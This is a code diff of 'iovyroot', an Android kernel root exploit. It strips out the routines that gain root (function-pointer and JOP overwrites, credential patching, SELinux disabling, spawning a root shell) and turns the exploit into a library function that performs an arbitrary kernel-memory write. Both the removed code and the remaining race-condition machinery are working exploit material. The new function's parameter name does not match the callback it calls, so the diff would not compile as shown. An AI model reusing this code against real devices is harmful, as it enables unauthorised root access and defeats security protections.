@@ -19,11 +19,6 @@ struct mmsghdr {
 	unsigned int msg_len;
 };
 
-#include "getroot.h"
-#include "sidtab.h"
-#include "policydb.h"
-#include "offsets.h"
-
 #define UDP_SERVER_PORT (5105)
 #define MEMMAGIC (0xDEADBEEF)
 //pipe buffers are seperated in pages
@@ -99,7 +94,7 @@ static void* writemsg(void* param)
 	soaddr.sin_family = AF_INET;
 	soaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
 	soaddr.sin_port = htons(UDP_SERVER_PORT);
-	
+
 	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
 	if (sockfd == -1)
 	{
@@ -107,7 +102,7 @@ static void* writemsg(void* param)
 		pthread_exit((void*)-1);
 	}
 
-	if (connect(sockfd, (struct sockaddr *)&soaddr, sizeof(soaddr)) == -1) 
+	if (connect(sockfd, (struct sockaddr *)&soaddr, sizeof(soaddr)) == -1)
 	{
 		perror("connect failed");
 		pthread_exit((void*)-1);
@@ -183,7 +178,7 @@ static int startmapunmap()
 	printf("    [+] Start map/unmap thread\n");
 	if((ret = pthread_create(&mapthread, NULL, mapunmap, NULL)))
 		perror("mapunmap pthread_create()");
-	
+
 	return ret;
 }
 
@@ -285,140 +280,27 @@ static int write_at_address(void* target, unsigned long targetval)
 	return 0;
 }
 
-#if !(__LP64__)
-int getroot(struct offsets* o)
+bool iovy_run_exploit(unsigned long address, int value,
+	bool(*explit_callback)(void* user_data), void *user_data)
 {
-	int dev;
-	int ret = 1;
-	struct thread_info* ti;
-
-	printf("[+] Installing func ptr\n");
-	if(write_at_address(o->fsync, (unsigned long)&patchaddrlimit))
-		return 1;
-
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
-		return 1;
-	
-	ti = (struct thread_info*)fsync(dev);
-	if(modify_task_cred_uc(ti))
-		goto end;
-
-
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
-
-	ret = 0;
-end:
-	close(dev);
-	return ret;
-}
-#else
-int getroot(struct offsets* o)
-{
-	int ret = 1;
-	int dev;
-	unsigned long fp;
-	struct thread_info* ti;
-	void* jopdata;
-
-	if((jopdata = mmap((void*)((unsigned long)MMAP_ADDR + MMAP_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0)) == (void*)-1)
-		return -ENOMEM;
-
-	printf("[+] Installing JOP\n");
-	if(write_at_address(o->check_flags, (unsigned long)o->joploc))
-		goto end2;
-
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	preparejop(jopdata, o->jopret);
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
-		goto end2;
-
-	//we only get the lower 32bit because the return of fcntl is int
-	fp = (unsigned)fcntl(dev, F_SETFL, jopdata);
-	fp += KERNEL_START;
-	ti = get_thread_info(fp);
-
-	printf("[+] Patching addr_limit\n");
-	if(write_at_address(&ti->addr_limit, -1))
-		goto end;
-	printf("[+] Removing JOP\n");
-	if(writel_at_address_pipe(o->check_flags, 0))
-		goto end;
-
-	if((ret = modify_task_cred_uc(ti)))
-		goto end;
-
-	//Z5 has domain auto trans from init to init_shell (restricted) so disable selinux completely
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
-
-	ret = 0;
-end:
-	close(dev);
-end2:
-	munmap(jopdata, PAGE_SIZE);
-	return ret;
-}
-#endif
-
-int main(int argc, char* argv[])
-{
-	unsigned int i;
-	int ret = 1;
-	struct offsets* o;
-
 	printf("iovyroot by zxz0O0\n");
 	printf("poc by idler1984\n\n");
 
-	if(!(o = get_offsets()))
-		return 1;
 	if(setfdlimit())
-		return 1;
+		return false;
 	if(setprocesspriority())
-		return 1;
+		return false;
 	if(getpipes())
-		return 1;
+		return false;
 	if(initmappings())
-		return 1;
+		return false;
 
-	ret = getroot(o);
+	write_at_address(address, value);
 	//let the threads end
 	sleep(1);
 
 	close(pipefd[0]);
 	close(pipefd[1]);
-	
-	if(getuid() == 0)
-	{
-		printf("got root lmao\n");
-		if(argc <= 1)
-			system("USER=root /system/bin/sh");
-		else
-		{
-			char cmd[128] = { 0 };
-			for(i = 1; i < (unsigned int)argc; i++)
-			{
-				if(strlen(cmd) + strlen(argv[i]) > 126)
-					break;
-				strcat(cmd, argv[i]);
-				strcat(cmd, " ");
-			}
-			system(cmd);
-		}
-	}
-	
-	return ret;
+
+	return exploit_callback(user_data);
 }
